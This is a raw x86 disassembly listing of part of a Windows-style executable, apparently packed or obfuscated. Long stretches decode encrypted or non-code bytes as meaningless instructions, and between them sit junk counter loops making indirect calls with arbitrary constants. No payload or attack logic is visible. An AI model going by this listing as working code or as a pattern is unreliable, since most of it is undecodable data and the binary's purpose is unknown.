  40a18f:	fstp   TBYTE PTR [ebp-0x33a2320f]
  40a195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a196:	in     eax,dx
  40a197:	aam    0x5
  40a199:	push   edx
  40a19a:	idiv   ch
  40a19c:	or     BYTE PTR [esi+0x52],cl
  40a19f:	dec    eax
  40a1a0:	lods   eax,DWORD PTR ds:[esi]
  40a1a1:	mov    eax,0x957071be
  40a1a6:	popf   
  40a1a7:	mov    esi,0xc928bfb8
  40a1ac:	jo     0x40a13a
  40a1ae:	std    
  40a1af:	sbb    DWORD PTR [edi-0x36],edi
  40a1b2:	dec    esp
  40a1b3:	xchg   ebp,eax
  40a1b4:	mov    ch,ah
  40a1b6:	xchg   esi,eax
  40a1b7:	mov    edx,0x9852ebfa
  40a1bc:	mov    esi,0x105616b0
  40a1c1:	imul   edx,DWORD PTR [eax-0x2e617154],0x1c
  40a1c8:	xor    al,0x92
  40a1ca:	pop    ecx
  40a1cb:	sbb    DWORD PTR [ecx-0x47986b1c],0xa907a72a
  40a1d5:	jno    0x40a1b7
  40a1d7:	(bad)  
  40a1d8:	mov    DWORD PTR [edx+0x4],edi
  40a1db:	adc    BYTE PTR [edx+ebp*1-0x80],al
  40a1df:	dec    esi
  40a1e0:	mov    WORD PTR [edx],cs
  40a1e2:	mov    fs,ebx
  40a1e4:	push   edx
  40a1e5:	jl     0x40a21e
  40a1e7:	ret    
  40a1e8:	mov    edi,0xecb180ef
  40a1ed:	and    bl,BYTE PTR [ebp-0x3dc7f8ce]
  40a1f3:	pop    ds
  40a1f4:	sub    ecx,ebx
  40a1f6:	outs   dx,DWORD PTR ds:[esi]
  40a1f7:	lock test BYTE PTR [esi-0x43],al
  40a1fb:	jns    0x40a1f5
  40a1fd:	mov    dl,BYTE PTR [ecx-0x534516e9]
  40a203:	xchg   esi,edx
  40a205:	mov    ebp,0xc231cbb0
  40a20a:	je     0x40a26e
  40a20c:	add    BYTE PTR [esi+0x145a1ea0],0x44
  40a213:	sub    BYTE PTR [ebx-0x1a9c35b0],0xaa
  40a21a:	push   0x3a
  40a21c:	ins    DWORD PTR es:[edi],dx
  40a21d:	aam    0x51
  40a21f:	bound  edx,QWORD PTR [edi]
  40a221:	das    
  40a222:	xor    dh,BYTE PTR [eax-0xe43fc8f]
  40a228:	push   ebp
  40a229:	xlat   BYTE PTR ds:[ebx]
  40a22a:	stc    
  40a22b:	imul   ecx,DWORD PTR [edx],0xffffffaa
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	mov    bh,0x47
  40a2c6:	adc    eax,0x70f5456c
  40a2cb:	jo     0x40a26c
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a324
  40a2d1:	pop    es
  40a2d2:	add    BYTE PTR [ebx-0x500b442c],0x90
  40a2d9:	push   eax
  40a2da:	jae    0x40a27d
  40a2dc:	lods   al,BYTE PTR ds:[esi]
  40a2dd:	sbb    al,0x3d
  40a2df:	cmp    eax,0xec1aa1a6
  40a2e4:	and    al,0x9c
  40a2e6:	inc    ecx
  40a2e7:	add    edi,edx
  40a2e9:	mov    edx,0x2285f607
  40a2ef:	popf   
  40a2f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2f1:	call   0x63c:0xe5cfd594
  40a2f8:	push   cs
  40a2f9:	mov    esi,0x80385f5e
  40a2fe:	xchg   esi,eax
  40a2ff:	nop
  40a300:	cmc    
  40a301:	lds    ebp,FWORD PTR [ebp+0x29dceaf0]
  40a307:	bound  ebp,QWORD PTR [edx]
  40a309:	retf   
  40a30a:	sbb    al,0x1d
  40a30c:	adc    eax,0xb4ca1fac
  40a311:	xor    BYTE PTR [esi+0x79],bh
  40a314:	shl    DWORD PTR [ecx],1
  40a316:	sub    al,0x9d
  40a318:	pop    es
  40a319:	popf   
  40a31a:	sbb    eax,0xb4f62e9d
  40a31f:	mov    dl,0xe7
  40a321:	fwait
  40a322:	ret    0xbe3f
  40a325:	test   BYTE PTR [esi],ch
  40a327:	adc    DWORD PTR [ebx+0x56],0x1f69548c
  40a32e:	lock inc edx
  40a330:	rol    BYTE PTR [eax-0x13372901],0x34
  40a337:	mov    ah,cl
  40a339:	ja     0x40a376
  40a33b:	nop
  40a33c:	repnz or ebp,DWORD PTR [edi-0x5431c61b]
  40a343:	bound  eax,QWORD PTR [ecx+esi*8-0x557d88d3]
  40a34a:	pop    esi
  40a34b:	shl    dl,1
  40a34d:	(bad)  
  40a34e:	cld    
  40a34f:	lahf   
  40a350:	mov    ebx,0xfa8a598c
  40a355:	xchg   ebp,eax
  40a356:	paddw  mm1,QWORD PTR [bx+si+0xc]
  40a35b:	pop    ecx
  40a35c:	mov    DWORD PTR [ebp+0x13367b36],ecx
  40a362:	cmc    
  40a363:	bound  ecx,QWORD PTR [edx-0x16]
  40a366:	mov    WORD PTR [edx+0xa],ss
  40a369:	mov    ch,0x48
  40a36b:	xchg   bh,al
  40a36d:	(bad)  
  40a36e:	xchg   ecx,eax
  40a36f:	out    0x0,al
  40a371:	test   eax,0x17fee891
  40a376:	cmp    eax,0xc7fbb656
  40a37b:	int    0x94
  40a37d:	inc    edi
  40a37e:	mov    cl,BYTE PTR [eax+0x32]
  40a381:	push   ebx
  40a382:	pop    esp
  40a383:	push   cs
  40a384:	bnd js 0x40a346
  40a387:	mov    ch,BYTE PTR [ecx-0x73]
  40a38a:	sub    DWORD PTR [esi],0x2d
  40a38d:	add    eax,edi
  40a38f:	jns    0x40a404
  40a391:	imul   eax,DWORD PTR [ebp+eax*1-0x4],0xffffff9c
  40a396:	adc    al,0x84
  40a398:	and    al,0x5d
  40a39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a39b:	and    ebp,ebp
  40a39d:	jecxz  0x40a35f
  40a39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a0:	mov    ch,0xd9
  40a3a2:	fnstsw WORD PTR [si+0x1a]
  40a3a6:	push   ds
  40a3a7:	retf   
  40a3a8:	cmp    al,0x2a
  40a3aa:	lods   eax,DWORD PTR ds:[esi]
  40a3ab:	or     BYTE PTR [eax],dl
  40a3ad:	sbb    DWORD PTR [ecx+0x1511035b],0x72
  40a3b4:	pop    esi
  40a3b5:	sbb    eax,0x5899fca9
  40a3ba:	mov    al,BYTE PTR [ebp+0x787a8f49]
  40a3c0:	mov    ah,0xcd
  40a3c2:	mov    ebp,0x2b990839
  40a3c7:	js     0x40a42f
  40a3c9:	mov    esp,0x1fa482ff
  40a3ce:	div    eax
  40a3d0:	xor    DWORD PTR [ebp+0x4b],ebp
  40a3d3:	mov    ds:0xd2ef6d91,al
  40a3d8:	xchg   edx,eax
  40a3d9:	sbb    al,0x36
  40a3db:	push   esp
  40a3dc:	fistp  DWORD PTR [edi-0x31d3463c]
  40a3e2:	dec    esp
  40a3e3:	in     al,dx
  40a3e4:	je     0x40a388
  40a3e6:	jg     0x40a3b0
  40a3e8:	mov    ch,0xe9
  40a3ea:	and    ah,BYTE PTR [edx+0xf]
  40a3ed:	xor    eax,0xda7ca837
  40a3f2:	jle    0x40a442
  40a3f4:	sub    bh,BYTE PTR [esi+0x2ca8fba7]
  40a3fa:	sar    DWORD PTR fs:[edi-0x47534948],1
  40a401:	mov    dh,0x21
  40a403:	je     0x40a41e
  40a405:	(bad)  
  40a406:	dec    ecx
  40a407:	add    BYTE PTR [edx-0x2],ch
  40a40a:	pop    es
  40a40b:	sub    eax,0xad14dd5c
  40a410:	cmp    al,0x28
  40a412:	nop
  40a413:	or     al,0x37
  40a415:	or     eax,0x3556954e
  40a41a:	lds    ecx,FWORD PTR [ebx+eax*2+0x316fd925]
  40a421:	jae    0x40a44c
  40a423:	and    eax,0x89e8831b
  40a428:	int3   
  40a429:	pop    esp
  40a42a:	sbb    DWORD PTR [ebp-0x37],ebx
  40a42d:	push   eax
  40a42e:	push   ds
  40a42f:	xor    DWORD PTR [edi],esp
  40a431:	jns    0x40a46f
  40a433:	sub    bh,al
  40a435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a436:	push   ebp
  40a437:	stos   DWORD PTR es:[edi],eax
  40a438:	(bad)  
  40a43a:	mov    bh,0x6e
  40a43c:	(bad)  [ecx]
  40a43e:	dec    ebx
  40a43f:	xor    DWORD PTR [ebp+0x73af0aa],ebp
  40a445:	mov    bh,0x3a
  40a447:	int3   
  40a448:	mov    ss,WORD PTR [edx-0x49]
  40a44b:	or     dl,ch
  40a44d:	jns    0x40a48f
  40a44f:	mov    edi,0x963e6346
  40a454:	push   0xffffffae
  40a456:	sahf   
  40a457:	mov    ah,0x87
  40a459:	cs sub eax,0x85f58de4
  40a45f:	xor    ebx,DWORD PTR [ebx+0x71]
  40a462:	xchg   esp,eax
  40a463:	inc    ebp
  40a464:	ins    DWORD PTR es:[edi],dx
  40a465:	pusha  
  40a466:	mov    esi,0xed917c34
  40a46b:	fcmovu st,st(1)
  40a46d:	fdivp  st(1),st
  40a46f:	inc    eax
  40a470:	lods   eax,DWORD PTR ds:[esi]
  40a471:	xor    al,0x8b
  40a473:	mov    al,0x1d
  40a475:	or     esp,0x27d81aa7
  40a47b:	sub    BYTE PTR [esi],cl
  40a47d:	test   DWORD PTR [ebx+0x649c804d],edx
  40a483:	and    dh,BYTE PTR [esi+0x6a92d5e7]
  40a489:	test   BYTE PTR [edx+0x76],dl
  40a48c:	xor    eax,0x63c886ed
  40a491:	push   eax
  40a492:	push   cs
  40a493:	fdivr  QWORD PTR [edi-0x63bc8d3f]
  40a499:	mov    ah,0x61
  40a49b:	mov    cl,0xf8
  40a49d:	adc    esi,DWORD PTR [edi]
  40a49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4a0:	sahf   
  40a4a1:	push   esi
  40a4a2:	clc    
  40a4a3:	out    0xc7,al
  40a4a5:	bound  edi,QWORD PTR [ecx+0x3]
  40a4a8:	or     DWORD PTR [eax+edi*4+0x49e21f60],ecx
  40a4af:	sbb    edx,DWORD PTR [ecx]
  40a4b1:	add    BYTE PTR [ecx+0x35722f2b],dl
  40a4b7:	fnstcw WORD PTR [ebp+0x34]
  40a4ba:	fadd   QWORD PTR [ecx]
  40a4bc:	mov    ah,0x9d
  40a4be:	leave  
  40a4bf:	push   es
  40a4c0:	or     ebx,0xffffffd7
  40a4c3:	lds    ebp,FWORD PTR [eax-0x7d6f152c]
  40a4c9:	dec    edi
  40a4ca:	pop    esp
  40a4cb:	adc    BYTE PTR [esi+0x402fa4b5],ah
  40a4d1:	mov    dh,0x45
  40a4d3:	mov    bh,0x71
  40a4d5:	cmp    eax,0x6b80d2bb
  40a4db:	push   ecx
  40a4dc:	mov    dl,BYTE PTR [edx-0x2b]
  40a4df:	dec    ecx
  40a4e0:	xchg   edi,ecx
  40a4e2:	rcl    DWORD PTR [edi-0x7613bc2c],0x24
  40a4e9:	push   0x4c639f3c
  40a4ee:	les    edx,FWORD PTR [ebx+0x65]
  40a4f1:	jnp    0x40a4f0
  40a4f3:	cmp    DWORD PTR [edi+0x6ae48cc],edi
  40a4f9:	and    cl,bh
  40a4fb:	in     eax,0x34
  40a4fd:	cmp    edx,DWORD PTR [esi]
  40a4ff:	jp     0x40a486
  40a501:	adc    BYTE PTR [edx],bh
  40a503:	xchg   esi,eax
  40a504:	or     eax,ecx
  40a506:	jmp    0x2c614026
  40a50b:	sbb    ch,BYTE PTR [edi+0x676b9711]
  40a511:	push   DWORD PTR [eax]
  40a513:	fdivr  QWORD PTR [edi]
  40a515:	inc    edi
  40a516:	aas    
  40a517:	cld    
  40a518:	sbb    edi,esp
  40a51a:	push   ebp
  40a51b:	outs   dx,BYTE PTR ds:[esi]
  40a51c:	in     eax,0xb6
  40a51e:	(bad)  
  40a51f:	lds    edi,FWORD PTR [edx+0x7925e863]
  40a525:	fcom   st(1)
  40a527:	adc    eax,0xc31ec96d
  40a52c:	add    dl,BYTE PTR [edx+0xd]
  40a52f:	shl    BYTE PTR [edx-0x28],1
  40a532:	int    0xd
  40a534:	adc    al,0x8d
  40a536:	cmp    eax,0x6b680fbb
  40a53b:	inc    edi
  40a53c:	loope  0x40a554
  40a53e:	fnstsw WORD PTR [edi+0x5f8f590]
  40a544:	push   edi
  40a545:	xor    bl,BYTE PTR [esi]
  40a547:	sub    bl,BYTE PTR [ecx]
  40a549:	xor    esp,DWORD PTR [edi+0x9]
  40a54c:	jne    0x40a5c1
  40a54e:	test   al,0xc2
  40a550:	ret    0x7a1e
  40a553:	lock mov esi,0x470cc7f2
  40a559:	mov    edi,0x846de983
  40a55e:	jle    0x40a5ad
  40a560:	add    DWORD PTR [edi+0x42b6a608],esi
  40a566:	and    DWORD PTR [eax],ebp
  40a568:	sub    dh,BYTE PTR [ecx+0x2ef73167]
  40a56e:	cmp    BYTE PTR [eax+0x12],0xaa
  40a572:	push   edi
  40a573:	adc    BYTE PTR [eax+0x6ffe35f],0x8
  40a57a:	cmp    eax,0xaa63d5f8
  40a57f:	fstp   TBYTE PTR [ecx]
  40a581:	stc    
  40a582:	jns    0x40a601
  40a584:	hlt    
  40a585:	les    esp,FWORD PTR [esi+0x12]
  40a588:	mov    edi,0xd44a1cfc
  40a58d:	mov    ah,0xf
  40a58f:	hlt    
  40a590:	ror    DWORD PTR [edi-0x66],0x8c
  40a594:	repnz inc ecx
  40a596:	pop    DWORD PTR [ebx]
  40a598:	dec    esi
  40a599:	lock mov dl,dl
  40a59c:	push   es
  40a59d:	mov    esi,0x6637e0bd
  40a5a2:	jp     0x40a536
  40a5a4:	(bad)  
  40a5a5:	mov    ebx,ecx
  40a5a7:	(bad)  
  40a5a8:	and    eax,0x4d7e5fa5
  40a5ad:	int    0xb5
  40a5af:	cld    
  40a5b0:	xlat   BYTE PTR ds:[ebx]
  40a5b1:	jno    0x40a598
  40a5b3:	outs   dx,DWORD PTR ds:[esi]
  40a5b4:	mov    al,ds:0x36725ae2
  40a5b9:	hlt    
  40a5ba:	jo     0x40a612
  40a5bc:	jl     0x40a598
  40a5be:	xor    edx,ebx
  40a5c0:	pop    es
  40a5c1:	leave  
  40a5c2:	pushf  
  40a5c3:	pop    ebx
  40a5c4:	fsub   st,st(7)
  40a5c6:	int    0xd6
  40a5c8:	or     DWORD PTR [esi+0x63],edi
  40a5cb:	mov    ah,bl
  40a5cd:	not    BYTE PTR [edx]
  40a5cf:	or     esp,DWORD PTR [esp+eiz*8+0x46b22c66]
  40a5d6:	or     ch,bh
  40a5d8:	(bad)  
  40a5da:	cmc    
  40a5db:	imul   ebx,ebp,0x44
  40a5de:	imul   esp,DWORD PTR [edx+0x7],0xffffffbe
  40a5e2:	mov    ebx,0x5f7454e1
  40a5e7:	mov    ds:0x2f113852,eax
  40a5ec:	jns    0x40a667
  40a5ee:	cli    
  40a5ef:	xor    DWORD PTR [esi],eax
  40a5f1:	test   BYTE PTR [eax+0x50a92bc6],cl
  40a5f7:	popa   
  40a5f8:	or     BYTE PTR [ebx+esi*4+0x1f12853e],ch
  40a5ff:	mov    ecx,0x56c13b0e
  40a604:	cmp    al,0x7b
  40a606:	mov    dh,0xe8
  40a608:	ja     0x40a681
  40a60a:	push   eax
  40a60b:	call   0x464a19ed
  40a610:	push   ebp
  40a611:	mov    bh,0xf4
  40a613:	ror    dh,1
  40a615:	addr16 cmp al,0x89
  40a618:	or     BYTE PTR [ebp-0x47],0xc4
  40a61c:	cwde   
  40a61d:	or     ch,ah
  40a61f:	fadd   DWORD PTR [edx-0x65]
  40a622:	jmp    0xb440:0x66f95bb0
  40a629:	xchg   DWORD PTR [eax+0x1479608f],ebx
  40a62f:	mov    dh,BYTE PTR [edi+0x51]
  40a632:	xor    cl,BYTE PTR [edi]
  40a634:	or     DWORD PTR [ebx-0x3961dd4d],esi
  40a63a:	and    al,0x48
  40a63c:	pop    esp
  40a63d:	xchg   ebx,eax
  40a63e:	fwait
  40a63f:	loope  0x40a611
  40a641:	dec    esp
  40a642:	in     eax,0x18
  40a644:	push   ebx
  40a645:	xchg   esp,edx
  40a647:	std    
  40a648:	sbb    ch,BYTE PTR [ebx]
  40a64a:	mov    ch,0x41
  40a64c:	dec    esp
  40a64d:	push   cs
  40a64e:	adc    esp,eax
  40a650:	stc    
  40a651:	or     eax,0xee12787a
  40a656:	lock sub eax,DWORD PTR [edi+ebx*1]
  40a65a:	ret    0xaf3d
  40a65d:	ss dec ebp
  40a65f:	push   cs
  40a660:	retf   0x287c
  40a663:	rcl    dh,1
  40a665:	mov    ds:0x1ec19454,eax
  40a66a:	jb     0x40a66e
  40a66c:	int    0x9f
  40a66e:	mov    ch,0x84
  40a670:	(bad)  
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	xchg   ecx,eax
  40a854:	fnstsw WORD PTR [edi+0x3c]
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a88f
  40a860:	push   edi
  40a861:	pop    ebx
  40a862:	loop   0x40a809
  40a864:	dec    ecx
  40a865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a866:	(bad)  
  40a868:	mov    esp,0x92e6a20e
  40a86d:	repz mov bh,0x59
  40a870:	jp     0x40a8aa
  40a872:	imul   ebx,DWORD PTR [ecx],0xb9642672
  40a878:	int3   
  40a879:	and    BYTE PTR [ebx+ebp*4],ch
  40a87c:	mov    esp,edx
  40a87e:	std    
  40a87f:	mov    ch,0x53
  40a881:	lock sbb al,0x2f
  40a884:	jno    0x40a86e
  40a886:	lea    edx,[edi-0x3a]
  40a889:	ja     0x40a8bd
  40a88b:	mov    dl,0x94
  40a88d:	aas    
  40a88e:	jno    0x40a8fb
  40a890:	dec    eax
  40a891:	adc    eax,0xc599a880
  40a896:	popa   
  40a897:	jnp    0x40a862
  40a899:	push   ss
  40a89a:	cmp    ebx,0x36
  40a89d:	fs cli 
  40a89f:	sti    
  40a8a0:	and    BYTE PTR [ecx-0x59],ah
  40a8a3:	shr    BYTE PTR ds:0x49a728e9,0xe1
  40a8aa:	aad    0x9e
  40a8ac:	call   0xd530:0xbc0d505
  40a8b3:	cld    
  40a8b4:	sub    esp,DWORD PTR [ebp+0x60]
  40a8b7:	add    BYTE PTR [ebx-0x477c57bc],0xf4
  40a8be:	add    BYTE PTR ds:0xda617b32,0xa9
  40a8c5:	clc    
  40a8c6:	fcmove st,st(3)
  40a8c8:	pop    es
  40a8c9:	cmp    DWORD PTR [ecx+ebx*1],ebx
  40a8cc:	sbb    al,ah
  40a8ce:	jmp    0x40a8e1
  40a8d0:	mov    BYTE PTR [edx],al
  40a8d2:	mov    al,ds:0x2458542c
  40a8d7:	cmp    DWORD PTR [ebx-0x472843e8],ebx
  40a8dd:	and    ecx,0x5c345119
  40a8e3:	push   esi
  40a8e4:	ret    0xb81e
  40a8e7:	xor    cl,BYTE PTR [ebx+0x4b]
  40a8ea:	dec    edx
  40a8eb:	in     eax,dx
  40a8ec:	sub    DWORD PTR [ecx+esi*1],0x3d
  40a8f0:	cmp    bl,BYTE PTR [edi-0x470add27]
  40a8f6:	mov    ecx,0xd31c0650
  40a8fb:	mov    al,ds:0xba2be962
  40a900:	inc    edx
  40a901:	sbb    DWORD PTR [ebp-0x6],ebp
  40a904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a905:	repnz bound esp,QWORD PTR [edx-0x7a]
  40a909:	pop    edx
  40a90a:	dec    eax
  40a90b:	mov    ch,BYTE PTR [ecx+0x2addaadc]
  40a911:	pop    ebp
  40a912:	aam    0x93
  40a914:	(bad)  
  40a915:	or     al,0xaa
  40a917:	pop    ss
  40a918:	pop    eax
  40a919:	ja     0x40a96f
  40a91b:	push   esi
  40a91c:	lods   eax,DWORD PTR ds:[esi]
  40a91d:	pop    ecx
  40a91e:	ss (bad) 
  40a920:	mov    ebx,0x6908f6d2
  40a925:	push   eax
  40a926:	dec    esp
  40a927:	pop    ecx
  40a928:	dec    ecx
  40a929:	neg    ebp
  40a92b:	add    BYTE PTR [eax-0x3f],bl
  40a92e:	scas   eax,DWORD PTR es:[edi]
  40a92f:	sbb    eax,0xf5200633
  40a934:	cmp    eax,0x69ce449a
  40a939:	push   ecx
  40a93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a93b:	add    edi,DWORD PTR [eax]
  40a93d:	sti    
  40a93e:	loope  0x40a979
  40a940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a941:	push   eax
  40a942:	and    eax,0x2422e80b
  40a947:	add    bh,BYTE PTR [eax]
  40a949:	mov    edx,0xcb5078c5
  40a94e:	jno    0x40a91a
  40a950:	mov    ecx,0x474cf060
  40a955:	inc    esi
  40a956:	div    DWORD PTR [ecx-0x43915249]
  40a95c:	pop    ebx
  40a95d:	enter  0xb4ff,0x36
  40a961:	fstp   TBYTE PTR [ebx+0x17e6f263]
  40a967:	pop    esp
  40a968:	dec    esi
  40a969:	call   0x5efd:0x54ab532d
  40a970:	in     al,dx
  40a971:	cmc    
  40a972:	push   ecx
  40a973:	mov    al,0xde
  40a975:	bound  ebx,QWORD PTR [eax]
  40a977:	cld    
  40a978:	pop    es
  40a979:	adc    ecx,DWORD PTR [ebx+0x3b902914]
  40a97f:	lock clc 
  40a981:	sbb    ch,BYTE PTR [esi]
  40a983:	xor    cl,BYTE PTR [eax-0x3b97ec17]
  40a989:	in     eax,dx
  40a98a:	sbb    BYTE PTR [eax+edx*1-0x6807b8d9],bh
  40a991:	inc    esi
  40a992:	out    0x47,eax
  40a994:	shl    ecx,1
  40a996:	and    dl,BYTE PTR [ebp+0xcacd3fb]
  40a99c:	mov    cl,0x95
  40a99e:	mov    ebp,0xa3a43f39
  40a9a3:	jmp    0x40a9c7
  40a9a5:	inc    edx
  40a9a6:	les    ebp,FWORD PTR [edi-0x5d]
  40a9a9:	mov    cl,0x89
  40a9ab:	sub    eax,0xbd1da997
  40a9b0:	mov    al,0xfa
  40a9b2:	cwde   
  40a9b3:	scas   al,BYTE PTR es:[edi]
  40a9b4:	adc    DWORD PTR [esi-0x54],0xa552f333
  40a9bb:	test   ecx,ecx
  40a9bd:	scas   eax,DWORD PTR es:[edi]
  40a9be:	or     DWORD PTR [esi+eax*2-0x768693dc],eax
  40a9c5:	das    
  40a9c6:	ja     0x40aa07
  40a9c8:	int3   
  40a9c9:	push   esp
  40a9ca:	sbb    esi,DWORD PTR [eax+0x5c35b42b]
  40a9d0:	jmp    0x40a956
  40a9d2:	aas    
  40a9d3:	fwait
  40a9d4:	imul   esp,DWORD PTR [edi],0x41
  40a9d7:	jg     0x40aa51
  40a9d9:	cli    
  40a9da:	stos   BYTE PTR es:[edi],al
  40a9db:	jne    0x40a99a
  40a9dd:	adc    esp,DWORD PTR [eax-0x1679cdfa]
  40a9e3:	push   esp
  40a9e4:	addr16 out 0xb1,al
  40a9e7:	xchg   edx,eax
  40a9e8:	mov    edx,ebx
  40a9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9eb:	xchg   ebp,eax
  40a9ec:	or     cl,cl
  40a9ee:	jecxz  0x40a9c6
  40a9f0:	bswap  esi
  40a9f2:	outs   dx,DWORD PTR ds:[esi]
  40a9f3:	idiv   BYTE PTR ds:0xdddf4dab
  40a9f9:	hlt    
  40a9fa:	xor    eax,0xf719124e
  40a9ff:	fwait
  40aa00:	sahf   
  40aa01:	cmc    
  40aa02:	js     0x40a99c
  40aa04:	adc    al,0xbb
  40aa06:	push   ebp
  40aa07:	and    edx,esi
  40aa09:	mov    ebp,0x3c05500f
  40aa0e:	xchg   ebx,eax
  40aa0f:	mov    eax,ds:0xc6e2f6b3
  40aa14:	pushf  
  40aa15:	push   eax
  40aa16:	cdq    
  40aa17:	lahf   
  40aa18:	jp     0x40a9e0
  40aa1a:	ret    0x5801
  40aa1d:	(bad)  
  40aa1e:	fwait
  40aa1f:	xor    eax,0xe65bcdd1
